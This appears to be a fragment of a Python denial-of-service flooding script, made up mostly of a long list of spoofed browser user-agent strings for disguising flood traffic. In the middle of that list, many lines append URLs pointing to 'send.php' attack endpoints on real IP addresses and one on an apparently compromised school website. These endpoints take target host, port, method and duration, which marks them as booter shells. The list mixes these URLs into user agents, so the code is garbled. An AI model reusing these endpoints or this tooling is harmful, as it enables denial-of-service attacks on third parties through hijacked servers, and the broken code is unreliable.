	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.4 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Iron/4.0.227.0 Chrome/4.0.227.0 Safari/532.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Maxthon/3.0.6.27 Safari/532.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.246.0 Safari/532.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1025 Safari/532.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.275.2 Safari/532.8 Iron/4.0.275.2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.280.0 Safari/532.8 Iron/4.0.280.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Iron/4.0.275.2 Chrome/4.0.275.2 Safari/532.8')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.1 Safari/532.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.275.0 Safari/532.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.336.0 Safari/533.1 ChromePlus/1.3.8.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Iron/5.0.326.0 Chrome/5.0.326.0 Safari/533.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Lunascape/6.4.2.23236 Safari/533.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.370.0 Safari/533.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.999 Safari/533.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/6.0.400.0 Safari/533.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020509)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020513)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020605)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020612)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020619)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020721)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020820)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020917)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020925)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021011)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021014)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021020)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021128)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021221)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020421)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020426)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020510)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020520)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020607)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020709)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020716)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020725)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020818)')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020509)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020513)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020605)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020612)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020619)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020721)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020820)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020917)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020925)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021011)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021014)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021020)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021128)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021221)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020421)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020426)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020510)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020520)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020607)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020709)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020716)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020725)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
